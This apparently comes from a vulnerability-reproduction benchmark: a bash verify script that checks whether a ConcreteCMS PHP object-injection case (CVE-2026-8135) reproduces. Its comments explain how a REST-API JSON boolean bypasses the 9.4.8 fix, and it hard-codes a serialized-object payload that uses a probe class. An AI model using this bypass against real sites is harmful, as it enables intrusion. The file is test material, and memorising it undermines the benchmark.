#!/usr/bin/env bash
# verify.sh (auto-adapted for PCBV2-0097, executor, flag_channel=X)
# 0=效果发生 10=未发生 20=环境失败 30=参数错误
set -uo pipefail
: "${RUN_ID:?}" "${COMPOSE_PROJECT_NAME:?}" "${RUN_FLAG:?}" "${VERSION:?}" "${WORK_DIR:?}"
MODE="${1:-}"
[[ "$MODE" == "--seed" || "$MODE" == "--residual" ]] || { echo "usage: --seed|--residual" >&2; exit 30; }
CASE_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PY="${PCB_PYTHON:-python3}"
mkdir -p "$WORK_DIR"
"$PY" "$CASE_DIR/poc/original_poc.py" "$VERSION" > "$WORK_DIR/cand.json" 2>/dev/null \
  || "$PY" "$CASE_DIR/poc/original_poc.py" > "$WORK_DIR/cand.json" 2>/dev/null
# flag placeholder replace (file-based)
"$PY" - "$RUN_FLAG" "$WORK_DIR/cand.json" <<ADAPTEOF
import re, sys
flag, p = sys.argv[1], sys.argv[2]
s = open(p, encoding="utf-8", errors="replace").read()
s = re.sub(r'PCBFLAG_[A-Za-z0-9_]+', flag, s)
open(p, "w").write(s)
ADAPTEOF
# wrap non-JSON candidate into multi-field dict (file-based)
"$PY" - "$WORK_DIR/cand.json" <<ADAPTEOF2
import json, sys
p = sys.argv[1]
s = open(p, encoding="utf-8", errors="replace").read().strip().strip(chr(34)).strip(chr(39))
try:
    json.loads(s)
except Exception:
    open(p, "w").write(json.dumps({"path": s, "to": s, "payload": s, "css": s}))
ADAPTEOF2
export PCB_X="$RUN_FLAG"
# 动态端口导出（compose 已转 PORT_ 动态端口；seed_exec 的 BASE 由 PCB_TARGET_PORT 覆盖）
CASE_DIR="${CASE_DIR:-$(cd "$(dirname "$0")/.." && pwd)}"
_SVC_ALL="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" --profile "$VERSION" config --services 2>/dev/null | grep -E "(^|-|_)$VERSION$")"
SVC="$(printf '%s\n' "$_SVC_ALL" | grep -vE "db|redis|mongo|mysql|postgres|sidecar|callback" | head -1)"
SVC="${SVC:-$(printf '%s\n' "$_SVC_ALL" | head -1)}"
_CP="$(grep -A4 '^service:' "$CASE_DIR/case.yaml" | grep -oE 'exposed_ports: \[[0-9, ]*\]' | grep -oE '[0-9]+' | head -1)"
_DYN="$(docker compose -p "$COMPOSE_PROJECT_NAME" --project-directory "$CASE_DIR" port "$SVC" "${_CP:-8080}" 2>/dev/null | sed 's/.*://' | tr -d '[:space:]')"
[[ -n "$_DYN" ]] && export PCB_TARGET_PORT="$_DYN"
export PCB_TARGET_PORT="${PCB_TARGET_PORT:-}"

export PYTHONPATH="$CASE_DIR${PYTHONPATH:+:$PYTHONPATH}"  # poc_common importable
# 就绪：pcb_driver.php 可访问（seed.sh 完整安装 ConcreteCMS 后由 seed.sh 拷入，Apache 200 早于安装完成）
DRIVER_READY=0
for _ in $(seq 1 90); do
  if curl -sf -m 3 "http://127.0.0.1:${PCB_TARGET_PORT:-0}/pcb_driver.php" >/dev/null 2>&1; then
    DRIVER_READY=1; break
  fi
  sleep 3
done
[[ "$DRIVER_READY" == 1 ]] || { echo "verify: pcb_driver.php not ready" >&2; exit 20; }
if [[ "$MODE" == "--seed" ]]; then
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
else
  # residual (CVE-2026-8135)：REST-API 通道。9.4.8 的修复只在 save() 里
  # `$fromCIF = ($data['_fromCIF'] ?? null) === true` 时才不 blank columns/filterFields；
  # 浏览器 form POST 只能带字符串 "true"（不 === true -> blank），但 REST API 用
  # json_decode() 解析 body，JSON `"_fromCIF": true` 是真正的 PHP boolean -> === true
  # 通过 -> blank 跳过 -> payload 存储 -> render unserialize() -> PcbFlagProbe -> flag。
  printf '%s' '{"id": "cve-2026-8135-rest-json-bool-fromcif", "json": "{\"args\":{\"columns\":\"O:12:\\\"PcbFlagProbe\\\":0:{}\",\"filterFields\":\"O:12:\\\"PcbFlagProbe\\\":0:{}\",\"_fromCIF\":true},\"saveMode\":\"request\"}"}' > "$WORK_DIR/cand.json"
  OUT="$("$PY" "$CASE_DIR/poc/seed_exec.py" "$WORK_DIR/cand.json" "$VERSION" 2>&1)" || { echo "$OUT" >&2; exit 20; }
fi
echo "$OUT" | head -c 500; echo
"$PY" -c "import json,sys
try:
    d = json.loads(sys.argv[1])
except Exception:
    sys.exit(20)
sys.exit(0 if d.get('X') == '$RUN_FLAG' else 10)" "$OUT"
